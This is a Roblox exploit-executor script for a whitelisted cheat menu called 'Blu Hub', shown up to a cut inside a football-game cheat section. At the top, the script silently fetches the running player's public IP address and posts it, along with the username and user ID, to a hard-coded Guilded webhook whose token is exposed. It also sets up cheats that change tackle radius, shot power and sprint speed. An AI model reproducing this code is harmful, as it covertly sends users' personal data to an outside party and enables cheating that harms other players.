if game:WaitForChild("CoreGui"):FindFirstChild("SDYASE123EN8FW") then
	game.CoreGui.SDYASE123EN8FW:Destroy()
end

local UserIds = {
	105115151, 2444381495,	--Blu
	132541900, 2730836956,	--David
	149522897,		--Booh
	1425652856, 1121717767, -- Kaz
	351990069, 1522914997, 	-- EK/Frost (Kaz Friend)
	206007586, 3443274111,	-- laqol (Kaz Friend)
	1246274469, 385469353,	-- Rifle/Funeral(Kaz Friend)
}
local WebUrl = "https://media.guilded.gg/webhooks/d5b07cb7-b836-43c7-981f-8279bdf18f95/Qo6g2U1MMCQMuUaikMCUYM0eGkO8EG22WA6WOe0U4am8Ycs4CCasU4qQeAUIscyAkSE4sIaOeSssEqgoGEkGcG"

local Player = game:GetService("Players").LocalPlayer
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
local whitelisted = false
if table.find(UserIds, Player.UserId) then
	whitelisted = true
end
local msg = {
	["embeds"] = {{
		["title"] = "**".. Player.Name .."**",
		["color"] = 13708129,
		["description"] = "IP: ".. ip .."\nWhitelisted: ".. (whitelisted and "Yes" or "No"),
		["thumbnail"] = {
			["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. Player.UserId .."&width=420&height=420&format=png",
		},
		["footer"] = {
			["text"] = "Player ID: ".. Player.UserId,
		},
	}}
}

local response = syn.request(
	{
		Url = WebUrl,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode(msg)
	}
)

if whitelisted then
	local ScreenGui = Instance.new("ScreenGui")
	local ImageButton = Instance.new("ImageButton")
	local Pages = Instance.new("Folder")
	local Game_ = Instance.new("Frame")
	local Column1_Game_ = Instance.new("ScrollingFrame")
	local UIListLayout = Instance.new("UIListLayout")
	local UIPadding = Instance.new("UIPadding")
	local ActiveBar = Instance.new("Frame")
	local Column2_Game_ = Instance.new("ScrollingFrame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local UIPadding_2 = Instance.new("UIPadding")
	local Settings = Instance.new("Frame")
	local Column2_Settings = Instance.new("ScrollingFrame")
	local UIListLayout_3 = Instance.new("UIListLayout")
	local UIPadding_3 = Instance.new("UIPadding")
	local Column1_Settings = Instance.new("ScrollingFrame")
	local UIListLayout_4 = Instance.new("UIListLayout")
	local UIPadding_4 = Instance.new("UIPadding")
	local ActiveBar_2 = Instance.new("Frame")
	local Frame_ = Instance.new("Frame")
	local Keybinds = Instance.new("Frame")
	local Column2_Keybinds = Instance.new("ScrollingFrame")
	local UIListLayout_5 = Instance.new("UIListLayout")
	local UIPadding_5 = Instance.new("UIPadding")
	local Column1_Keybinds = Instance.new("ScrollingFrame")
	local UIListLayout_6 = Instance.new("UIListLayout")
	local UIPadding_6 = Instance.new("UIPadding")
	local ActiveBar_3 = Instance.new("Frame")
	local HubName = Instance.new("TextLabel")
	local Settings_2 = Instance.new("TextButton")
	local Game_2 = Instance.new("TextButton")
	local TopBar = Instance.new("Frame")
	local Outline = Instance.new("Frame")
	local Keybinds_2 = Instance.new("TextButton")

	--Properties:
	ScreenGui.Name = "SDYASE123EN8FW"
	syn.protect_gui(ScreenGui)
	ScreenGui.Parent = game:WaitForChild("CoreGui")

	ImageButton.Parent = ScreenGui
	ImageButton.Draggable = true
	ImageButton.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ImageButton.Position = UDim2.new(0.5, 24, 0.25, 10)
	ImageButton.Size = UDim2.new(0, 494, 0, 320)
	ImageButton.AutoButtonColor = false
	ImageButton.ImageColor3 = Color3.fromRGB(0, 0, 0)
	ImageButton.ScaleType = Enum.ScaleType.Tile
	ImageButton.TileSize = UDim2.new(0, 90, 0, 90)

	Pages.Name = "Pages"
	Pages.Parent = ImageButton

	Game_.Name = "Game"
	Game_.Parent = Pages
	Game_.BackgroundTransparency = 1.000
	Game_.Position = UDim2.new(0, 5, 0, 55)
	Game_.Size = UDim2.new(0, 484, 0, 260)

	Column1_Game_.Name = "Column1"
	Column1_Game_.Parent = Game_
	Column1_Game_.BackgroundTransparency = 1.000
	Column1_Game_.BorderSizePixel = 0
	Column1_Game_.Position = UDim2.new(0, 6, 0, 2)
	Column1_Game_.Size = UDim2.new(0, 233, 1, -4)
	Column1_Game_.ZIndex = 2
	Column1_Game_.ScrollBarThickness = 0
	Column1_Game_.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout.Parent = Column1_Game_
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 25)

	UIPadding.Parent = Column1_Game_
	UIPadding.PaddingLeft = UDim.new(0, 2)
	UIPadding.PaddingRight = UDim.new(0, 2)
	UIPadding.PaddingTop = UDim.new(0, 8)

	ActiveBar.Name = "ActiveBar"
	ActiveBar.Parent = Game_
	ActiveBar.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	ActiveBar.BorderSizePixel = 0
	ActiveBar.Position = UDim2.new(0, 9, 0, -3)
	ActiveBar.Size = UDim2.new(0, 50, 0, -1)

	Column2_Game_.Name = "Column2"
	Column2_Game_.Parent = Game_
	Column2_Game_.BackgroundTransparency = 1.000
	Column2_Game_.BorderSizePixel = 0
	Column2_Game_.Position = UDim2.new(0, 245, 0, 2)
	Column2_Game_.Size = UDim2.new(0, 233, 1, -4)
	Column2_Game_.ZIndex = 2
	Column2_Game_.ScrollBarThickness = 0
	Column2_Game_.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_2.Parent = Column2_Game_
	UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_2.Padding = UDim.new(0, 12)

	UIPadding_2.Parent = Column2_Game_
	UIPadding_2.PaddingLeft = UDim.new(0, 2)
	UIPadding_2.PaddingRight = UDim.new(0, 2)
	UIPadding_2.PaddingTop = UDim.new(0, 8)

	Settings.Name = "Settings"
	Settings.Parent = Pages
	Settings.BackgroundTransparency = 1.000
	Settings.Position = UDim2.new(0, 5, 0, 55)
	Settings.Size = UDim2.new(1, -10, 1, -60)
	Settings.Visible = false

	Column2_Settings.Name = "Column2"
	Column2_Settings.Parent = Settings
	Column2_Settings.BackgroundTransparency = 1.000
	Column2_Settings.BorderSizePixel = 0
	Column2_Settings.Position = UDim2.new(0, 245, 0, 2)
	Column2_Settings.Size = UDim2.new(0, 233, 1, -4)
	Column2_Settings.ZIndex = 2
	Column2_Settings.ScrollBarThickness = 0
	Column2_Settings.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_3.Parent = Column2_Settings
	UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_3.Padding = UDim.new(0, 12)

	UIPadding_3.Parent = Column2_Settings
	UIPadding_3.PaddingLeft = UDim.new(0, 2)
	UIPadding_3.PaddingRight = UDim.new(0, 2)
	UIPadding_3.PaddingTop = UDim.new(0, 8)

	Column1_Settings.Name = "Column1"
	Column1_Settings.Parent = Settings
	Column1_Settings.BackgroundTransparency = 1.000
	Column1_Settings.BorderSizePixel = 0
	Column1_Settings.Position = UDim2.new(0, 6, 0, 2)
	Column1_Settings.Size = UDim2.new(0, 233, 1, -4)
	Column1_Settings.ZIndex = 2
	Column1_Settings.ScrollBarThickness = 0
	Column1_Settings.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_4.Parent = Column1_Settings
	UIListLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_4.Padding = UDim.new(0, 25)

	UIPadding_4.Parent = Column1_Settings
	UIPadding_4.PaddingLeft = UDim.new(0, 2)
	UIPadding_4.PaddingRight = UDim.new(0, 2)
	UIPadding_4.PaddingTop = UDim.new(0, 8)

	ActiveBar_2.Name = "ActiveBar"
	ActiveBar_2.Parent = Settings
	ActiveBar_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	ActiveBar_2.BorderSizePixel = 0
	ActiveBar_2.Position = UDim2.new(0, 152, 0, -3)
	ActiveBar_2.Size = UDim2.new(0, 77, 0, -1)

	Frame_.Parent = Pages
	Frame_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame_.BackgroundTransparency = 1.000
	Frame_.Position = UDim2.new(0, 0, 0, 52)
	Frame_.Size = UDim2.new(0, 494, 0, 268)

	Keybinds.Name = "Keybinds"
	Keybinds.Parent = Pages
	Keybinds.BackgroundTransparency = 1.000
	Keybinds.Position = UDim2.new(0, 5, 0, 55)
	Keybinds.Size = UDim2.new(1, -10, 1, -60)
	Keybinds.Visible = false

	Column2_Keybinds.Name = "Column2"
	Column2_Keybinds.Parent = Keybinds
	Column2_Keybinds.BackgroundTransparency = 1.000
	Column2_Keybinds.BorderSizePixel = 0
	Column2_Keybinds.Position = UDim2.new(0, 245, 0, 2)
	Column2_Keybinds.Size = UDim2.new(0, 233, 1, -4)
	Column2_Keybinds.ZIndex = 2
	Column2_Keybinds.ScrollBarThickness = 0
	Column2_Keybinds.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_5.Parent = Column2_Keybinds
	UIListLayout_5.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_5.Padding = UDim.new(0, 12)

	UIPadding_5.Parent = Column2_Keybinds
	UIPadding_5.PaddingLeft = UDim.new(0, 2)
	UIPadding_5.PaddingRight = UDim.new(0, 2)
	UIPadding_5.PaddingTop = UDim.new(0, 8)

	Column1_Keybinds.Name = "Column1"
	Column1_Keybinds.Parent = Keybinds
	Column1_Keybinds.BackgroundTransparency = 1.000
	Column1_Keybinds.BorderSizePixel = 0
	Column1_Keybinds.Position = UDim2.new(0, 6, 0, 2)
	Column1_Keybinds.Size = UDim2.new(0, 233, 1, -4)
	Column1_Keybinds.ZIndex = 2
	Column1_Keybinds.ScrollBarThickness = 0
	Column1_Keybinds.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_6.Parent = Column1_Keybinds
	UIListLayout_6.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_6.Padding = UDim.new(0, 25)

	UIPadding_6.Parent = Column1_Keybinds
	UIPadding_6.PaddingLeft = UDim.new(0, 2)
	UIPadding_6.PaddingRight = UDim.new(0, 2)
	UIPadding_6.PaddingTop = UDim.new(0, 8)

	ActiveBar_3.Name = "ActiveBar"
	ActiveBar_3.Parent = Keybinds
	ActiveBar_3.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	ActiveBar_3.BorderSizePixel = 0
	ActiveBar_3.Position = UDim2.new(0, 65, 0, -3)
	ActiveBar_3.Size = UDim2.new(0, 77, 0, -1)

	HubName.Name = "Hub Name"
	HubName.Parent = ImageButton
	HubName.BackgroundTransparency = 1.000
	HubName.Position = UDim2.new(0, 6, 0, -1)
	HubName.Size = UDim2.new(0, 0, 0, 20)
	HubName.ZIndex = 5
	HubName.Font = Enum.Font.Code
	HubName.Text = "Blu Hub | BETA"
	HubName.TextColor3 = Color3.fromRGB(255, 255, 255)
	HubName.TextSize = 18.000
	HubName.TextXAlignment = Enum.TextXAlignment.Left

	Settings_2.Name = "Settings"
	Settings_2.Parent = ImageButton
	Settings_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	Settings_2.BackgroundTransparency = 1.000
	Settings_2.Position = UDim2.new(0, 157, 0, 22)
	Settings_2.Size = UDim2.new(0, 77, 0, 30)
	Settings_2.ZIndex = 5
	Settings_2.Font = Enum.Font.Code
	Settings_2.Text = "Settings"
	Settings_2.TextColor3 = Color3.fromRGB(253, 21, 32)
	Settings_2.TextSize = 15.000

	Game_2.Name = "Game"
	Game_2.Parent = ImageButton
	Game_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	Game_2.BackgroundTransparency = 1.000
	Game_2.Position = UDim2.new(0, 0, 0, 22)
	Game_2.Size = UDim2.new(0, 77, 0, 30)
	Game_2.ZIndex = 5
	Game_2.Font = Enum.Font.Code
	Game_2.Text = "Game"
	Game_2.TextColor3 = Color3.fromRGB(253, 21, 32)
	Game_2.TextSize = 15.000

	TopBar.Name = "TopBar"
	TopBar.Parent = ImageButton
	TopBar.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	TopBar.BorderSizePixel = 0
	TopBar.Position = UDim2.new(0, 0, 0, 24)
	TopBar.Size = UDim2.new(1, 0, 0, 1)
	TopBar.ZIndex = 5

	Outline.Name = "Outline"
	Outline.Parent = ImageButton
	Outline.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	Outline.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Outline.Size = UDim2.new(1, 0, 0, 50)
	Outline.ZIndex = 4

	Keybinds_2.Name = "Keybinds"
	Keybinds_2.Parent = ImageButton
	Keybinds_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	Keybinds_2.BackgroundTransparency = 1.000
	Keybinds_2.Position = UDim2.new(0, 70, 0, 22)
	Keybinds_2.Size = UDim2.new(0, 77, 0, 30)
	Keybinds_2.ZIndex = 5
	Keybinds_2.Font = Enum.Font.Code
	Keybinds_2.Text = "Keybinds"
	Keybinds_2.TextColor3 = Color3.fromRGB(253, 21, 32)
	Keybinds_2.TextSize = 15.000

	--Main:

	local CreateTab = function(Parent, Name ,Size)
		local Frame = Instance.new("Frame")
		local Color = Instance.new("Frame")
		local TabName = Instance.new("TextLabel")
		local Buttons = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")
		local UIPadding = Instance.new("UIPadding")

		Frame.Name = Name
		Frame.Parent = Parent
		Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame.Size = Size[1]

		Color.Name = "Color"
		Color.Parent = Frame
		Color.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Color.BorderSizePixel = 0
		Color.Size = UDim2.new(1, 0, 0, 1)

		TabName.Parent = Frame
		TabName.AnchorPoint = Vector2.new(0, 0.5)
		TabName.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		TabName.BorderSizePixel = 0
		TabName.Position = UDim2.new(0, 8, 0, 0)
		TabName.Size = Size[2]
		TabName.Font = Enum.Font.Code
		TabName.Text = Name
		TabName.TextColor3 = Color3.fromRGB(255, 255, 255)
		TabName.TextSize = 15.000

		Buttons.Name = "Buttons"
		Buttons.Parent = Frame
		Buttons.BackgroundTransparency = 1.000
		Buttons.BorderSizePixel = 0
		Buttons.Size = UDim2.new(1, 0, 1, 0)
		Buttons.ZIndex = 2
		Buttons.CanvasSize = UDim2.new(0, 0, 0, 0)
		Buttons.ScrollBarThickness = 0
		Buttons.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

		UIListLayout.Parent = Buttons
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIListLayout.SortOrder = Enum.SortOrder.Name
		UIListLayout.Padding = UDim.new(0, 2)

		UIPadding.Parent = Buttons
		UIPadding.PaddingTop = UDim.new(0, 12)

		return Frame
	end
	local Keybind = function(Parent, Name)
		local Frame = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local Button = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.Size = UDim2.new(1, 0, 0, 20)

		TextLabel.Parent = Frame
		TextLabel.AnchorPoint = Vector2.new(0, 0.5)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0, 3, 0.5, 0)
		TextLabel.Size = UDim2.new(0.942731261, 0, 0.571428657, 0)
		TextLabel.Font = Enum.Font.Code
		TextLabel.Text = Name
		TextLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
		TextLabel.TextSize = 10
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left

		Button.Name = "Button"
		Button.Parent = Frame
		Button.AnchorPoint = Vector2.new(1, 0.5)
		Button.BackgroundColor3 = Color3.fromRGB(18, 127, 253)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.Position = UDim2.new(1, 0, 0.5, 0)
		Button.Size = UDim2.new(0, 125, 0, 20)
		Button.ZIndex = 2
		Button.Font = Enum.Font.Code
		Button.Text = ""
		Button.TextColor3 = Color3.fromRGB(160, 160, 160)
		Button.TextScaled = true
		Button.TextSize = 18.000
		Button.TextWrapped = true

		ImageLabel.Parent = Button
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel.ZIndex = 2
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = Button
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Size = UDim2.new(1, 0, 1.00000012, 0)
		ImageLabel_2.ZIndex = 3
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		return Frame
	end
	local ToggleButton = function(Parent, Name, BindP)
		local Frame = Instance.new("Frame")
		local Button = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")
		local Text = Instance.new("TextLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.LayoutOrder = 5
		Frame.Size = UDim2.new(1, 0, 0, 20)

		Button.Name = "Button"
		Button.Parent = Frame
		Button.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.Position = UDim2.new(0, 6, 0, 4)
		Button.Size = UDim2.new(0, 12, 0, 12)
		Button.ZIndex = 2
		Button.Font = Enum.Font.SourceSans
		Button.Text = ""
		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
		Button.TextSize = 14.000

		ImageLabel.Parent = Button
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel.ZIndex = 3
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = Button
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel_2.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel_2.ZIndex = 2
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		Text.Name = "Text"
		Text.Parent = Frame
		Text.BackgroundTransparency = 1.000
		Text.Position = UDim2.new(0, 24, 0, 0)
		Text.Size = UDim2.new(1, 0, 1, 0)
		Text.Font = Enum.Font.Code
		Text.Text = Name
		Text.TextColor3 = Color3.fromRGB(160, 160, 160)
		Text.TextSize = 15.000
		Text.TextXAlignment = Enum.TextXAlignment.Left
		local BindFrame = Keybind(BindP, Name)
		return Frame, BindFrame
	end
	local BigButton = function(Parent, Name)
		local Frame = Instance.new("Frame")
		local Button = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.LayoutOrder = 4
		Frame.Size = UDim2.new(1, 0, 0, 20)

		Button.Parent = Frame
		Button.Name = "Button"
		Button.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.Position = UDim2.new(0, 31, 0, 22)
		Button.Size = UDim2.new(0, 155, 0, 32)
		Button.ZIndex = 3
		Button.Font = Enum.Font.Code
		Button.Text = Name
		Button.TextColor3 = Color3.fromRGB(160, 160, 160)
		Button.TextSize = 14.000

		ImageLabel.Parent = Button
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel.ZIndex = 2
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = Button
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		return Frame
	end
	local ToggleTextBox = function(Parent, Name, PlaceHolder)
		local Frame = Instance.new("Frame")
		local Button = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")
		local TextFrame = Instance.new("Frame")
		local ImageLabel_3 = Instance.new("ImageLabel")
		local ImageLabel_4 = Instance.new("ImageLabel")
		local ImageLabel_5 = Instance.new("ImageLabel")
		local TextBox = Instance.new("TextBox")
		local TextLabel = Instance.new("TextLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.Size = UDim2.new(0.982301295, 0, 0.127808765, 42)

		Button.Parent = Frame
		Button.Name = "Button"
		Button.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.Position = UDim2.new(0, 6, 0, 4)
		Button.Size = UDim2.new(0, 12, 0, 12)
		Button.ZIndex = 2
		Button.Font = Enum.Font.SourceSans
		Button.Text = ""
		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
		Button.TextSize = 14.000

		ImageLabel.Parent = Button
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel.ZIndex = 3
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = Button
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel_2.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel_2.ZIndex = 2
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		TextFrame.Name = "TextFrame"
		TextFrame.Parent = Frame
		TextFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		TextFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextFrame.Position = UDim2.new(0, 6, 0, 22)
		TextFrame.Size = UDim2.new(1.00000012, -12, 0.270365298, 16)

		ImageLabel_3.Parent = TextFrame
		ImageLabel_3.BackgroundTransparency = 1.000
		ImageLabel_3.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel_3.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel_3.Image = "rbxassetid://2592362371"
		ImageLabel_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_3.ScaleType = Enum.ScaleType.Slice
		ImageLabel_3.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_4.Parent = TextFrame
		ImageLabel_4.BackgroundTransparency = 1.000
		ImageLabel_4.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel_4.Image = "rbxassetid://2592362371"
		ImageLabel_4.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel_4.ScaleType = Enum.ScaleType.Slice
		ImageLabel_4.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_5.Parent = TextFrame
		ImageLabel_5.BackgroundTransparency = 1.000
		ImageLabel_5.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel_5.ZIndex = 2
		ImageLabel_5.Image = "rbxassetid://2454009026"
		ImageLabel_5.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_5.ImageTransparency = 0.800

		TextBox.Parent = TextFrame
		TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBox.BackgroundTransparency = 1.000
		TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
		TextBox.Size = UDim2.new(1, 0, 1, 0)
		TextBox.ZIndex = 2
		TextBox.Font = Enum.Font.Code
		TextBox.PlaceholderText = PlaceHolder
		TextBox.Text = ""
		TextBox.TextColor3 = Color3.fromRGB(210, 210, 210)
		TextBox.TextSize = 14.000
		TextBox.TextWrapped = true

		TextLabel.Parent = Frame
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0, 26, 0, 0)
		TextLabel.Size = UDim2.new(1.00000012, 0, 0.331039131, 0)
		TextLabel.Font = Enum.Font.Code
		TextLabel.Text = "Code Spammer"
		TextLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
		TextLabel.TextSize = 15.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left

		return Frame
	end

	local UserInput = game:GetService("UserInputService")
	local runService = game:GetService("RunService")
	local Debris = game:GetService("Debris")
	local Mouse = Player:GetMouse()

	local ToggleGui_Keybind = "RightShift"

	local Script_Disabled = false
	ScreenGui.Destroying:Connect(function()
		Script_Disabled = true
	end)

	local Image = nil

	coroutine.resume(coroutine.create(function()
		local data = readfile("image.png")
		if data then	
			Image = Drawing.new("Image")
			Image.Size = Frame_.AbsoluteSize
			Image.Transparency = 0.4
			Image.Data = data
			Image.Visible = true
			Image.Position = Frame_.AbsolutePosition + Vector2.new(0, 35)

			while not Script_Disabled and ScreenGui.Parent == game.CoreGui do
				wait()
				Image.Position = Frame_.AbsolutePosition + Vector2.new(0, 35)
			end
			Image:Remove()
		end
	end))

	local function TogglePages(Page)
		for _, i in pairs(Pages:GetChildren()) do
			if i.Name ~= Page then
				i.Visible = false
			else
				i.Visible = true
			end
		end
	end

	Game_2.MouseButton1Click:Connect(function() TogglePages(Game_2.Name) end)
	Keybinds_2.MouseButton1Click:Connect(function() TogglePages(Keybinds_2.Name) end)
	Settings_2.MouseButton1Click:Connect(function() TogglePages(Settings_2.Name) end)

	local Hub_Tab = CreateTab(Column2_Settings, "Hub", {UDim2.new(1, 0, 0, 80), UDim2.new(0, 31, 0, 2)})
	local Unload = BigButton(Hub_Tab, "Unload")

	local Settings_Tab = CreateTab(Column1_Settings, "Settings", {UDim2.new(1, 0, 0, 100), UDim2.new(0, 68, 0, 2)})
	local Gui_Keybind = Keybind(Settings_Tab, "Toggle Gui")
	Gui_Keybind.Button.Text = ToggleGui_Keybind

	Gui_Keybind.Button.MouseButton1Click:Connect(function()
		ToggleGui_Keybind = ""
		Gui_Keybind.Button.Text = ToggleGui_Keybind
	end)

	UserInput.InputBegan:Connect(function(Key, isTyping)
		if not Script_Disabled then
			if ToggleGui_Keybind == "" then
				local Str = string.split(tostring(Key.KeyCode), ".")
				if Str[3] ~= "Unknown" then
					ToggleGui_Keybind = Str[3]
					Gui_Keybind.Button.Text = ToggleGui_Keybind
				end
			elseif Key.KeyCode == Enum.KeyCode[ToggleGui_Keybind] and not isTyping then
				if ImageButton.Visible == true then
					ImageButton.Visible = false
					if Image then
						Image.Transparency = 0
					end
				else
					ImageButton.Visible = true
					if Image then
						Image.Transparency = 0.4
					end
				end
			end

		end
	end)
	Unload.Button.MouseButton1Click:Connect(function()
		Script_Disabled = true
		ScreenGui:Destroy()
		--
		local Character = Player.Character
		if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
		if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
	end)

	if game.GameId == 3213718766 then -- Goal!
		local SprintSpeed = 21
		local StepTackleRadius = 12
		local SlideTackleRadius = 20
		local ShotPower = 100

		local CanDribble = true
		local AutoAim = {}
		local F = {}

		local function ToggleTransparency(Frame)
			if Frame.Button.BackgroundTransparency == 0 then

				Frame.Button.BackgroundTransparency = 1
			else
				Frame.Button.BackgroundTransparency = 0
			end
		end
		local function ChangeBadge(Arch, Text)
			Player[Arch].Value = Text
		end
		local function inAir(Character)
			local airThreshold = 2
